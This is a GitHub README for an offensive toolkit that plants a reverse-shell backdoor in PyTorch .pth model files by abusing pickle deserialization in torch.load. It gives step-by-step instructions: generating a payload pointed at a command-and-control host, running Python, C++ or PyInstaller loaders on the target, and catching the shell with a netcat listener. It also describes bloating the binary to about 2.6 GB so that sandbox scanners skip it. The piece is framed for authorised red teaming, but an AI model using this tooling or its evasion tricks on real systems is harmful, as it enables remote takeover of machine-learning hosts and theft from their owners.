# PyTorch Backdoor PoC - Insecure Deserialization Exploitation

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: AGPL v3](https://img.shields.io/badge/License-AGPLv3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)

This repository provides a proof-of-concept (PoC) toolkit for demonstrating the insecure deserialization vulnerability present in PyTorch’s `torch.load()` when `weights_only=False` (the default behaviour in versions prior to 2.6). The payload is embedded in a `.pth` (or `.pt`) file and, upon loading, executes a reverse shell to a remote Command & Control (C2) server. The project includes both Python and C++ loaders, as well as packaging scripts to produce standalone binaries.

**Target Audience:** Security researchers, red teamers, and penetration testers conducting authorised assessments on machine learning pipelines.

**Repository:** [https://github.com/grisuno/pytbackdoorch](https://github.com/grisuno/pytbackdoorch)

---

## Project Files

- **`backdoor.py`** – Primary generator script. Creates a malicious `.pth` file via `torch.save()` of a class whose `__reduce__` method executes arbitrary Python code. Supports interactive input and command-line flags (`-H`, `-P`, `-o`). Also generates the Python loader script and a C++ loader template.

- **`backdoor.pth`** – Sample output file (generated by `backdoor.py`). This is the infected PyTorch weights file that contains the serialised malicious object.

- **`loader.py`** – Python script that invokes `torch.load()` on the provided `.pth` file. It forces `weights_only=False`, thus triggering the embedded payload. If executed with no argument, it attempts to load `backdoor.pth` from the current directory.

- **`loader.cpp`** – C++ implementation using LibTorch (the C++ frontend of PyTorch). It reads the `.pth` file as a binary blob and deserialises it via `torch::pickle_load()`. This bypasses the `Module`‑specific loading and still executes the pickle‑based payload.

- **`Makefile`** – Build script for `loader.cpp`. It expects a LibTorch installation (set `TORCH_DIR` environment variable or pass it as an argument). Includes flags to handle ABI compatibility and linker settings.

- **`loader.spec`** – PyInstaller specification file (automatically generated) used to customise the packaging of `loader.py`.

- **`pysintaller.sh`** – Shell script that invokes PyInstaller with the necessary options to create a standalone ELF executable from `loader.py`. The command bundles the Python interpreter, PyTorch libraries, and all required hidden imports into a single binary.

## Prerequisites

- Python 3.8 or later
- PyTorch (`torch`) – any version that supports `weights_only=False` (tested with 1.8.0 to 2.5.1; for 2.6+ the flag must be explicitly set to `False`)
- (Optional) PyInstaller – for binary packaging
- (Optional) LibTorch – for compiling the C++ loader

Install dependencies:

```bash
pip install torch
```

For packaging with PyInstaller:

```bash
pip install pyinstaller
```

For the C++ loader, ensure LibTorch is installed (e.g., from [pytorch.org](https://pytorch.org/cppdocs/installing.html)) and set `TORCH_DIR`.

## Usage

### 1. Generate the Malicious `.pth` File

Run `backdoor.py` either interactively or via command-line arguments.

**Interactive mode** (prompts for C2 host, port, and output filename):

```bash
python backdoor.py
```

**Command-line mode**:

```bash
python backdoor.py -H <C2_IP> -P <C2_PORT> -o <output.pth>
```

Example:

```bash
python backdoor.py -H 192.168.1.10 -P 4444 -o evil.pth
```

The script also produces `loader.py` and `loader.cpp` in the same directory.

### 2. Deploy and Execute the Payload

On the target machine, you have several options:

#### a) Use the Python Loader (requires PyTorch installed on target)

```bash
python loader.py evil.pth
```

If no argument is given, it tries `backdoor.pth`.

#### b) Use the Standalone Binary (PyInstaller)

Package `loader.py` with the included `pysintaller.sh` script:

```bash
bash pysintaller.sh
```

This will create `dist/loader` – a single ELF binary that contains all dependencies and, if you embed the `.pth` as a resource, the malicious file itself. Transfer the binary to the target and execute it:

```bash
./loader
```

(Optionally, you can embed the `.pth` file by adding `--add-data "evil.pth:."` to the PyInstaller command in the script.)

#### c) Use the C++ Loader (requires LibTorch on target)

Compile `loader.cpp` using the provided Makefile:

```bash
make TORCH_DIR=/path/to/libtorch
```

Then run:

```bash
./loader_cpp
```

The loader reads `backdoor.pth` (hardcoded; you can modify the source) and triggers the payload.

### 3. Establish the Reverse Shell

Before executing the loader, start a netcat listener on the C2 machine:

```bash
nc -lvnp 4444
```

When the payload is triggered, a `/bin/sh -i` session will connect back to this listener.

## Technical Overview

The exploitation vector relies on Python’s `pickle` module, which PyTorch uses internally for serialisation. By defining a class with a `__reduce__` method that returns a callable and its arguments, arbitrary code can be executed during deserialisation. The PoC crafts such an object, encodes a reverse‑shell script in Base64, and stores it inside the `.pth` file.

When `torch.load(..., weights_only=False)` is called, the pickle loader invokes `__reduce__` and runs the payload. This is a known vulnerability (CVE‑2018‑...), and many real‑world systems still use unsafe loading for compatibility with custom modules.

**Important Security Consideration:** Starting from PyTorch 2.6, the default value of `weights_only` was changed to `True` in many distributions, mitigating this attack unless the loader explicitly opts out. However, numerous legacy systems and quick‑and‑dirty inference scripts continue to use the unsafe mode.

---

## Compilation Notes for C++ Loader

The C++ loader (`loader.cpp`) uses LibTorch's `pickle_load` function, which is equally vulnerable. The Makefile assumes a shared library installation. Common pitfalls and solutions:

- **ABI mismatch**: Add `-D_GLIBCXX_USE_CXX11_ABI=1` (or `0`) to match the version used when LibTorch was built. The Makefile already includes this flag.
- **rpath**: The `-Wl,-rpath,$(TORCH_DIR)/lib` linker flag ensures the executable finds the shared libraries at runtime without setting `LD_LIBRARY_PATH`.
- **Missing headers**: If compilation fails due to missing `c10/core/TensorTypeId.h` or similar, explicitly include that header before `<torch/script.h>` (the sample code in this repo does so).

## Packaging with PyInstaller

The `pysintaller.sh` script runs:

```bash
pyinstaller --onefile \
            --hidden-import torch \
            --hidden-import torch.serialization \
            --hidden-import torch._C \
            --hidden-import torch._C._cudnn \
            --hidden-import torch._C._nvtx \
            --collect-all torch \
            loader.py
```

This creates a standalone binary that does not require Python or PyTorch to be pre‑installed on the target. For production use, The large binary size (~2.6 GB) is an intentional anti‑sandbox countermeasure: many automated analysis environments enforce file‑size thresholds (typically 100–500 MB) and either skip scanning or abort execution for larger objects, thereby evading both static signature matching and resource‑constrained dynamic emulation.
